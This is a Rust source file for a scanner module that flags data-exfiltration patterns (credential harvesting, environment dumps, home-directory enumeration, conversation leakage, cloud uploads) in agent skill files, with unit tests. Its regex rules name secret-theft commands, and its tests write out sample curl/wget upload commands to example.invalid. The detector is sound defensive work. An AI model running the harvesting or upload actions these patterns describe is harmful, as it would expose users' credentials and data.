//! E1-E5 from `static_patterns_data_exfiltration.py`: external transmission, environment
//! harvesting, file system enumeration, context leakage and cloud storage exfiltration.

use super::common::cut_chars;
use super::common::{Head, hit_finding};
use crate::finding::RawFinding;
use crate::issue::Severity;
use crate::matcher::{Hit, Pat, paragraph_matches};
use crate::pyast::ast::{Constant, Expr, ExprCall, Ranged, Stmt};
use crate::pyast::{
    Aliases, Node, PyFile, apply_import_aliases, resolve_call_name, resolve_dotted_name, walk,
};
use crate::runner::StaticModule;
use crate::shell_tokens::e1_shell_command_ranges;
use crate::skill::FileType;
use crate::text::LineIndex;
use std::collections::HashSet;
use std::sync::LazyLock;

const TAG: &str = "Data Exfiltration";

/// (source, confidence).
type Rule = (&'static str, f32);

const E1_CURL: Rule = (
    r"curl\s+[^|]*(?:-d|--data|--data-raw|--data-binary)\s+",
    0.6,
);
const E1_WGET: Rule = (r"wget\s+[^|]*--post-(?:data|file)", 0.6);

const E1_CODE: [Rule; 8] = [
    (r#"requests\s*\.\s*(?:post|put)\s*\(\s*['"]https?://"#, 0.6),
    (r"requests\s*\.\s*(?:post|put)\s*\([^)]*json\s*=", 0.7),
    (r#"httpx\s*\.\s*(?:post|put)\s*\(\s*['"]https?://"#, 0.6),
    (
        r"urllib\s*\.\s*request\s*\.\s*urlopen\s*\([^)]*data\s*=",
        0.6,
    ),
    (
        r#"fetch\s*\(\s*['"]https?://[^'"]+['"][^)]*method\s*:\s*['"]POST['"]"#,
        0.6,
    ),
    E1_CURL,
    E1_WGET,
    (
        r"https?://(?:api\.|data\.|collect\.|telemetry\.|analytics\.)[\w.-]+/",
        0.5,
    ),
];
const E1_PROSE: [Rule; 1] = [(
    r"(?:send|transmit|post|upload)\s+(?:user\s+)?(?:data|information|context|files?)\s+to\s+(?:https?://|external)",
    0.7,
)];

const E2_PYTHON_FALLBACK: [Rule; 4] = [
    (
        r"for\s+\w+\s*,\s*\w+\s+in\s+os\s*\.\s*environ\s*\.\s*items\s*\(\s*\)",
        0.7,
    ),
    (r"os\s*\.\s*environ\s*\.\s*copy\s*\(\s*\)", 0.6),
    (r"dict\s*\(\s*os\s*\.\s*environ\s*\)", 0.6),
    (r"\{\s*\*\*\s*os\s*\.\s*environ\s*\}", 0.6),
];
const E2_OTHER_CODE: [Rule; 5] = [
    (
        r"(?:API_KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)\s+in\s+(?:key|name|var)",
        0.8,
    ),
    (
        r#"process\.env\s*\[\s*['"][^'"]*(?:KEY|SECRET|TOKEN|PASSWORD)[^'"]*['"]\s*\]"#,
        0.7,
    ),
    (r"Object\.keys\s*\(\s*process\.env\s*\)", 0.6),
    (
        r"env\s*\|\s*grep\s+(?:-i\s+)?(?:key|secret|token|password)",
        0.8,
    ),
    (r"printenv\s+(?:\w*(?:KEY|SECRET|TOKEN|PASSWORD)\w*)", 0.7),
];
const E2_PROSE: [Rule; 2] = [
    (
        r"collect\s+(?:all\s+)?(?:environment\s+variables?|env\s+vars?)",
        0.7,
    ),
    (
        r"(?:extract|harvest|gather)\s+(?:api\s+)?keys?\s+from\s+environment",
        0.8,
    ),
];

const E3_CODE: [Rule; 7] = [
    (
        r"glob\s*\.\s*glob\s*\([^)]*(?:\.env|\.ssh|\.aws|\.config|credentials)",
        0.8,
    ),
    (r"os\s*\.\s*walk\s*\([^)]*(?:home|~|/Users|/home)", 0.6),
    (
        r"Path\s*\.\s*home\s*\(\s*\)\s*\.\s*(?:glob|rglob)\s*\(",
        0.7,
    ),
    (
        r"os\s*\.\s*listdir\s*\([^)]*(?:\.ssh|\.aws|\.config|\.gnupg)",
        0.8,
    ),
    (r"scandir\s*\([^)]*(?:home|~|/Users|/home)", 0.6),
    (
        r#"find\s+[~\$/]\S*\s+.*?-name\s+['"]?\*(?:\.env|\.pem|\.key|credential)"#,
        0.8,
    ),
    (r"ls\s+-[la]*R?\s+(?:~/|/home/|/Users/)", 0.6),
];
const E3_PROSE: [Rule; 4] = [
    (
        r"(?:find|search|scan|enumerate)\s+(?:for\s+)?(?:all\s+)?(?:\.env|credential|secret|key)\s+files?",
        0.8,
    ),
    (
        r"(?:list|get)\s+(?:all\s+)?files?\s+(?:in|from)\s+(?:home|~|/Users|/home)",
        0.6,
    ),
    (
        r"(?:recursively|recursive)\s+(?:scan|search|find|list)\s+(?:all\s+)?files?",
        0.5,
    ),
    (
        r"walk\s+(?:through\s+)?(?:the\s+)?(?:entire\s+)?(?:file\s*system|directory|home)",
        0.6,
    ),
];

const E4: [Rule; 9] = [
    (
        r"(?:send|transmit|upload|log|record)\s+(?:the\s+)?(?:full\s+)?(?:conversation|chat|dialog|session)\s+(?:history|context|log)?",
        0.85,
    ),
    (
        r"(?:export|dump|save)\s+(?:the\s+)?(?:conversation|chat|messages?)\s+to\s+(?:external|remote|server)",
        0.9,
    ),
    (
        r"log\s+(?:all\s+)?(?:user\s+)?(?:input|messages?|queries?|prompts?)\s+to\s+(?:external|remote|server)",
        0.85,
    ),
    (
        r"(?:store|save|record)\s+(?:every|all)\s+(?:user\s+)?(?:interaction|message|input)",
        0.7,
    ),
    (
        r"(?:extract|capture|collect)\s+(?:the\s+)?(?:full\s+)?(?:context|conversation|thread)",
        0.75,
    ),
    (
        r"(?:include|attach|append)\s+(?:previous\s+)?(?:messages?|context|history)\s+in\s+(?:the\s+)?(?:request|payload)",
        0.7,
    ),
    (
        r"(?:send|upload|transmit)\s+(?:the\s+)?(?:session|memory|state)\s+(?:data\s+)?to",
        0.8,
    ),
    (
        r"(?:copy|clone|replicate)\s+(?:the\s+)?(?:agent|assistant)\s+(?:memory|context|state)",
        0.75,
    ),
    (
        r"(?:always\s+)?include\s+(?:the\s+)?(?:full\s+)?(?:conversation|context)\s+(?:when|in)\s+(?:calling|making)\s+(?:external|api)",
        0.8,
    ),
];

const E5: [Rule; 8] = [
    (r"\.put_object\s*\(", 0.55),
    (r"\.upload_file(?:obj)?\s*\(", 0.55),
    (r"\baws\s+s3\s+(?:cp|sync|mv)\b", 0.6),
    (r"\baws\s+s3api\s+put-object\b", 0.65),
    (r"\bgsutil\s+(?:cp|rsync|mv)\b", 0.6),
    (r"\.upload_from_(?:filename|string|file)\s*\(", 0.55),
    (r"\baz\s+storage\s+blob\s+upload\b", 0.6),
    (r"\.upload_blob\s*\(", 0.55),
];

/// How a rule's matches are produced.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Mode {
    Plain,
    Prose,
    /// `_iter_e1_shell_matches`.
    Shell,
}

struct Compiled {
    pat: Pat,
    confidence: f32,
    mode: Mode,
}

fn compile(rules: &[Rule], prose: &[Rule]) -> Vec<Compiled> {
    let one = |&(src, confidence): &Rule, mode| Compiled {
        pat: Pat::new(src, "im"),
        confidence,
        mode,
    };
    rules
        .iter()
        .map(|r| {
            let shell = *r == E1_CURL || *r == E1_WGET;
            one(r, if shell { Mode::Shell } else { Mode::Plain })
        })
        .chain(prose.iter().map(|r| one(r, Mode::Prose)))
        .collect()
}

static E1_RE: LazyLock<Vec<Compiled>> = LazyLock::new(|| compile(&E1_CODE, &E1_PROSE));
static E2_FALLBACK_RE: LazyLock<Vec<Compiled>> =
    LazyLock::new(|| compile(&E2_PYTHON_FALLBACK, &[]));
static E2_OTHER_RE: LazyLock<Vec<Compiled>> = LazyLock::new(|| compile(&E2_OTHER_CODE, &E2_PROSE));
static E3_RE: LazyLock<Vec<Compiled>> = LazyLock::new(|| compile(&E3_CODE, &E3_PROSE));
static E4_RE: LazyLock<Vec<Compiled>> = LazyLock::new(|| {
    E4.iter()
        .map(|&(src, confidence)| Compiled {
            pat: Pat::new(src, "im"),
            confidence,
            mode: Mode::Prose,
        })
        .collect()
});
static E5_RE: LazyLock<Vec<Compiled>> = LazyLock::new(|| compile(&E5, &[]));

/// `_iter_e1_shell_matches`: each proved command range is matched anchored at its start.
fn shell_matches(pat: &Pat, text: &str, ranges: &[(usize, Option<usize>)]) -> Vec<Hit> {
    let mut out = Vec::new();
    let mut covered = 0;
    for &(start, end) in ranges {
        let Some(end) = end else {
            out.extend(pat.find_in(text, start.max(covered), text.len()));
            return out;
        };
        if start < covered {
            continue;
        }
        // `compiled.match(content, start, end)`: leftmost search keeps the anchored result.
        if let Some(hit) = pat
            .find_in(text, start, end)
            .into_iter()
            .next()
            .filter(|h| h.start == start)
        {
            covered = hit.end;
            out.push(hit);
        }
    }
    out
}

fn hits(c: &Compiled, text: &str, ranges: &[(usize, Option<usize>)]) -> Vec<Hit> {
    match c.mode {
        Mode::Plain => c.pat.find_iter(text),
        Mode::Prose => paragraph_matches(&c.pat, text),
        Mode::Shell => shell_matches(&c.pat, text, ranges),
    }
}

/// `_ENVIRONMENT_MAPPING_METHOD_CONFIDENCE`.
fn mapping_method_confidence(method: &str) -> Option<f32> {
    match method {
        "copy" | "keys" | "values" => Some(0.6),
        "items" => Some(0.7),
        _ => None,
    }
}

fn is_os_environ(e: &Expr, aliases: &Aliases) -> bool {
    resolve_dotted_name(e).is_some_and(|n| apply_import_aliases(&n, aliases) == "os.environ")
}

/// `_has_direct_environ_argument`.
fn has_direct_environ_argument(call: &ExprCall, aliases: &Aliases) -> bool {
    call.args.iter().any(|a| is_os_environ(a, aliases))
        || call
            .keywords
            .iter()
            .any(|k| k.arg.is_none() && is_os_environ(&k.value, aliases))
}

/// `_is_dynamic_copy_call`: `__import__('copy').copy(...)`.
fn is_dynamic_copy_call(call: &ExprCall, aliases: &Aliases) -> bool {
    let Expr::Attribute(attr) = &*call.func else {
        return false;
    };
    if !matches!(attr.attr.as_str(), "copy" | "deepcopy") {
        return false;
    }
    let Expr::Call(inner) = &*attr.value else {
        return false;
    };
    resolve_call_name(inner, Some(aliases)).as_deref() == Some("__import__")
        && matches!(
            inner.args.first(),
            Some(Expr::Constant(c)) if matches!(&c.value, Constant::Str(s) if s == "copy")
        )
}

/// `_analyze_python_environment_reads`: complete `os.environ` copies and enumerations.
/// `None` means the source did not parse, so the caller keeps the regex fallback.
fn python_environment_reads(
    text: &str,
    path: &str,
    py: Option<&PyFile>,
) -> Option<Vec<RawFinding>> {
    let parsed;
    let py = match py {
        Some(p) => p,
        None => {
            parsed = PyFile::parse(text, path);
            &parsed
        }
    };
    let tree = py.tree.as_deref()?;
    let aliases = &py.import_aliases;
    let mut emitted: HashSet<*const Expr> = HashSet::new();
    let mut out = Vec::new();
    let mut emit = |node: &Expr, confidence: f32| {
        if !emitted.insert(std::ptr::from_ref(node)) {
            return;
        }
        let pos = py.pos(node.range());
        let seg = py
            .node_segment(node)
            .filter(|s| !s.is_empty())
            .unwrap_or("os.environ");
        let mut f = RawFinding::new(
            "E2",
            "Env Variable Harvesting",
            Severity::High,
            confidence,
            path,
            pos.line,
        );
        f.end_line = Some(pos.end_line);
        f.tags = vec![TAG.to_owned()];
        f.matched_text = Some(cut_chars(seg, 200).to_owned());
        f.fingerprint_text = Some(seg.to_owned());
        out.push(f);
    };
    walk(tree, |node| match node {
        Node::Expr(e @ Expr::Call(call)) => {
            if let Some(name) = resolve_call_name(call, Some(aliases)) {
                let method = name.rsplit('.').next().unwrap_or_default();
                if name.starts_with("os.environ.")
                    && let Some(c) = mapping_method_confidence(method)
                {
                    return emit(e, c);
                }
                if (matches!(
                    name.as_str(),
                    "dict" | "list" | "tuple" | "set" | "frozenset" | "copy.copy" | "copy.deepcopy"
                )) && has_direct_environ_argument(call, aliases)
                {
                    return emit(e, 0.6);
                }
            }
            if is_dynamic_copy_call(call, aliases) && has_direct_environ_argument(call, aliases) {
                emit(e, 0.6);
            }
        }
        Node::Expr(e @ Expr::Dict(d)) => {
            if d.keys
                .iter()
                .zip(&d.values)
                .any(|(k, v)| k.is_none() && is_os_environ(v, aliases))
            {
                emit(e, 0.6);
            }
        }
        Node::Stmt(Stmt::For(f)) if is_os_environ(&f.iter, aliases) => emit(&f.iter, 0.7),
        Node::Stmt(Stmt::AsyncFor(f)) if is_os_environ(&f.iter, aliases) => emit(&f.iter, 0.7),
        Node::Comprehension(c) if is_os_environ(&c.iter, aliases) => emit(&c.iter, 0.7),
        _ => {}
    });
    Some(out)
}

/// The E1-E5 static module.
pub struct DataExfiltration;

impl StaticModule for DataExfiltration {
    fn id(&self) -> &'static str {
        "static_patterns_data_exfiltration"
    }

    fn uses_python_ast(&self) -> bool {
        true
    }

    fn analyze(
        &self,
        text: &str,
        path: &str,
        ft: FileType,
        py: Option<&PyFile>,
    ) -> Vec<RawFinding> {
        let index = LineIndex::new(text);
        let mut out = Vec::new();
        let mut emit = |rules: &[Compiled],
                        head: &Head<'_>,
                        ranges: &[(usize, Option<usize>)],
                        boost: bool| {
            for c in rules {
                let confidence = if boost {
                    (c.confidence + 0.1).min(1.0)
                } else {
                    c.confidence
                };
                for hit in hits(c, text, ranges) {
                    out.push(hit_finding(head, confidence, path, text, &hit, &index));
                }
            }
        };
        let head = |rule, message, severity| Head {
            rule,
            message,
            severity,
            tag: TAG,
        };
        let ranges = e1_shell_command_ranges(text, ft);
        let boost = matches!(
            ft,
            FileType::Python | FileType::Javascript | FileType::Shell
        );
        emit(
            &E1_RE,
            &head("E1", "External Transmission", Severity::Medium),
            &ranges,
            boost,
        );
        let e2 = head("E2", "Env Variable Harvesting", Severity::High);
        let mut ast_findings = Vec::new();
        if ft == FileType::Python {
            match python_environment_reads(text, path, py) {
                Some(f) => ast_findings = f,
                None => {
                    emit(&E2_FALLBACK_RE, &e2, &[], false);
                }
            }
        }
        emit(&E2_OTHER_RE, &e2, &[], false);
        emit(
            &E3_RE,
            &head("E3", "File System Enumeration", Severity::Medium),
            &[],
            false,
        );
        emit(
            &E4_RE,
            &head("E4", "Context Leakage", Severity::High),
            &[],
            false,
        );
        emit(
            &E5_RE,
            &head("E5", "Cloud Storage Exfiltration", Severity::Medium),
            &[],
            false,
        );
        out.extend(ast_findings);
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(text: &str, path: &str, ft: FileType) -> Vec<RawFinding> {
        DataExfiltration.analyze(text, path, ft, None)
    }

    fn e1(text: &str, ft: FileType) -> Vec<RawFinding> {
        run(text, "SKILL.md", ft)
            .into_iter()
            .filter(|f| f.rule_id == "E1")
            .collect()
    }

    fn has(text: &str, path: &str, id: &str) -> bool {
        let ft = FileType::from_path(path);
        run(text, path, ft).iter().any(|f| f.rule_id == id)
    }

    #[test]
    fn all_compile() {
        let all = [
            &E1_CODE[..],
            &E1_PROSE,
            &E2_PYTHON_FALLBACK,
            &E2_OTHER_CODE,
            &E2_PROSE,
            &E3_CODE,
            &E3_PROSE,
            &E4,
            &E5,
        ];
        for rules in all {
            for (src, _) in rules {
                assert!(Pat::try_new(src, "im").is_ok(), "{src}");
            }
        }
    }

    #[test]
    fn separate_command_cannot_supply_upload_flag() {
        for fetch in ["curl -fsS", "wget -qO-"] {
            for flag in ["-d sample", "--data sample", "--post-data=sample"] {
                for sep in ["\n", "\r\n", " && ", " || ", " & "] {
                    let c = format!("{fetch} http://127.0.0.1:8080/health{sep}utility {flag}");
                    assert!(e1(&c, FileType::Shell).is_empty(), "{c:?}");
                }
            }
        }
    }

    #[test]
    fn distinct_markdown_fences_cannot_share_flags() {
        for fence in ["```", "~~~~"] {
            for (fetch, flag) in [("curl -fsS", "-d"), ("wget -qO-", "--post-file")] {
                let c = format!(
                    "# Local status\n\n{fence}sh\n{fetch} http://127.0.0.1:8080/health\n{fence}\n\n# Container startup\n\n{fence}sh\ndocker run {flag} example-service\n{fence}\n"
                );
                assert!(e1(&c, FileType::Markdown).is_empty(), "{c:?}");
            }
        }
    }

    #[test]
    fn soft_wrapped_document_content_keeps_conservative_detection() {
        for c in [
            "curl http://127.0.0.1:8080/health\n\nA utility accepts --data payload.",
            "curl\n utility --data payload",
            "wget\n utility --post-data=payload",
        ] {
            assert!(!e1(c, FileType::Markdown).is_empty(), "{c:?}");
        }
    }

    #[test]
    fn real_uploads_remain_detected() {
        let cmds = [
            "curl https://example.invalid/submit -d payload",
            "curl https://example.invalid/submit --data-binary @payload.txt",
            "wget https://example.invalid/submit --post-file=payload.txt",
            "curl https://example.invalid/submit \\\r\n  --data payload",
            "curl \"https://example.invalid/\nsubmit\" --data payload",
            "curl \"$(printf https://example.invalid/; printf submit)\" --data payload",
            "bash -c \"curl https://example.invalid/submit --data payload\"",
            "{ curl https://example.invalid/submit --data payload; }",
            "if true; then curl https://example.invalid/submit --data payload; fi",
            "curl https://example.invalid/submit <<EOF --data @-\npayload\nEOF",
            "Run curl https://example.invalid/submit --data payload to submit.",
        ];
        for ft in [FileType::Markdown, FileType::Shell] {
            for c in cmds {
                let f = e1(c, ft);
                assert!(!f.is_empty(), "{c:?}");
                assert!(f.iter().all(|f| f.severity == Severity::Medium));
            }
        }
    }

    #[test]
    fn unproved_boundaries_retain_conservative_detection() {
        for c in [
            "curl https://example.invalid/submit ^\n --data payload",
            "curl \"unclosed\n --data payload",
            "curl (Get-Endpoint) --data payload",
            "curl https://example.invalid/submit `\n --data payload",
            "curl --% https://example.invalid/path;part --data payload",
            "curl https://example.invalid/path;parameter --data payload",
            "curl https://example.invalid/submit #fragment --data payload",
        ] {
            assert!(!e1(c, FileType::Shell).is_empty(), "{c:?}");
        }
        let long = format!(
            "curl {}https://example.invalid/submit --data payload",
            "--header x ".repeat(1_000)
        );
        assert!(!e1(&long, FileType::Shell).is_empty());
    }

    #[test]
    fn native_argument_data_cannot_end_an_upload_command() {
        for sep in [
            "\r", "\x0b", "\x0c", "\u{85}", "\u{2028}", "\u{2029}", "\u{a0}", "\x1c", "\x1d",
            "\x1e",
        ] {
            for suffix in [" ", "#label "] {
                let c = format!(
                    "curl --user-agent Agent{sep}{suffix}https://example.invalid/submit --data payload"
                );
                assert!(!e1(&c, FileType::Shell).is_empty(), "{c:?}");
            }
        }
    }

    #[test]
    fn nested_or_repeated_fetches_keep_evidence() {
        let repeated = format!(
            "curl https://example.invalid/ {} --data payload",
            "curl x ".repeat(1_000)
        );
        for c in [
            "wget \"$(curl https://example.invalid/submit --data payload)\"",
            "curl --header \"x: |\" \"$(curl https://example.invalid/submit --data payload)\"",
            repeated.as_str(),
        ] {
            assert!(!e1(c, FileType::Shell).is_empty());
        }
    }

    #[test]
    fn multiple_uploads_keep_separate_locations_and_evidence() {
        for (sep, lines) in [("\n", [2, 3]), (" && ", [1, 1])] {
            let c = format!(
                "curl http://127.0.0.1:8080/health{sep}curl https://example.invalid/first --data first{sep}curl https://example.invalid/second --data second"
            );
            let f = e1(&c, FileType::Shell);
            assert_eq!(f.len(), 2);
            assert_eq!(
                f.iter()
                    .map(|f| f.matched_text.as_deref())
                    .collect::<Vec<_>>(),
                [
                    Some("curl https://example.invalid/first --data "),
                    Some("curl https://example.invalid/second --data "),
                ]
            );
            assert_eq!(f.iter().map(|f| f.start_line).collect::<Vec<_>>(), lines);
        }
    }

    #[test]
    fn later_upload_keeps_exact_source_evidence() {
        let command = format!(
            "curl --header {} https://example.invalid/submit --data ",
            "x".repeat(240)
        );
        let c = format!("curl http://127.0.0.1:8080/health\n\n{command}payload\n");
        let f = e1(&c, FileType::Shell);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].start_line, 3);
        assert_eq!(f[0].matched_text.as_deref(), Some(&command[..200]));
        assert_eq!(f[0].fingerprint_text.as_deref(), Some(command.as_str()));
    }

    #[test]
    fn fenced_later_upload_location() {
        let c = "```sh\ncurl http://127.0.0.1:8080/health\ncurl https://example.invalid/submit \\\n  --data payload\n```\n";
        let f = e1(c, FileType::Markdown);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].start_line, 3);
        assert_eq!(
            f[0].matched_text.as_deref(),
            Some("curl https://example.invalid/submit \\\n  --data ")
        );
    }

    #[test]
    fn non_shell_e1_patterns_are_unchanged() {
        for c in [
            "requests.post(\"https://example.invalid/submit\", json={\"message\": \"hello\"})",
            "send user data to external services",
            "https://api.example.invalid/v1/",
        ] {
            assert!(!e1(c, FileType::Markdown).is_empty(), "{c}");
        }
    }

    #[test]
    fn e1_confidence_is_boosted_for_code() {
        let c = "https://api.example.invalid/v1/";
        assert!((e1(c, FileType::Python)[0].confidence - 0.6).abs() < 1e-6);
        assert!((e1(c, FileType::Markdown)[0].confidence - 0.5).abs() < 1e-6);
    }

    #[test]
    fn e2_regex_paths() {
        assert!(has(
            "import os\nfor k, v in os.environ.items():\n    pass",
            "s.py",
            "E2"
        ));
        assert!(has("import os\nenv_copy = {**os.environ}", "s.py", "E2"));
        let c =
            "import os\nx = os . environ . copy ()\ny = dict ( os.environ )\nz = { ** os.environ }";
        let n = run(c, "s.py", FileType::Python)
            .iter()
            .filter(|f| f.rule_id == "E2")
            .count();
        assert!(n >= 3);
        let bad = run(
            "import os\nresult = 2 ** os.environ\n   def broken(",
            "s.py",
            FileType::Python,
        );
        assert!(!bad.iter().any(|f| f.rule_id == "E2"));
        assert!(has("Collect all environment variables", "a.md", "E2"));
    }

    #[test]
    fn e5_cloud_uploads() {
        for (c, p) in [
            (
                "For example, you can call s3.put_object(...) to upload your backup.",
                "README.md",
            ),
            (
                "# for example\ns3.put_object(Bucket='x', Key='k', Body=d)",
                "up.py",
            ),
            ("aws s3 cp a s3://b", "a.sh"),
            ("gsutil cp a gs://b", "a.sh"),
            ("blob.upload_from_filename(p)", "a.py"),
            ("az storage blob upload -f x", "a.sh"),
        ] {
            assert!(has(c, p, "E5"), "{c}");
        }
        assert!(!has(
            "import boto3\ns3 = boto3.client(\"s3\")\nbuckets = s3.list_buckets()",
            "up.py",
            "E5"
        ));
    }

    #[test]
    fn e3_e4_prose() {
        assert!(has("find all .env files in the repo", "a.md", "E3"));
        assert!(has(
            "export the conversation to external storage",
            "a.md",
            "E4"
        ));
    }

    #[test]
    fn e2_ast_dict_call_with_extra_args() {
        let c = "dict(os.environ, A=1)\n";
        assert!(has(c, "s.py", "E2"));
    }

    #[test]
    fn e2_ast_forms() {
        for c in [
            "import os\nx = os.environ.copy()",
            "import os as o\nfor k in o.environ: pass",
            "from os import environ\nx = [k for k in environ]",
            "import os\nx = {**os.environ, 'a': 1}",
            "import copy, os\ncopy.deepcopy(os.environ)",
            "import os\n__import__('copy').copy(os.environ)",
            "import os\nsorted(os.environ.keys())",
        ] {
            assert!(has(c, "s.py", "E2"), "{c}");
        }
        for c in [
            "import os\nx = os.environ.get('A')",
            "import os\nrun(env=os.environ)",
        ] {
            assert!(!has(c, "s.py", "E2"), "{c}");
        }
        // Unparsable Python keeps the regex fallback.
        assert!(has("dict(os.environ)\nif x:\n", "s.py", "E2"));
    }
}
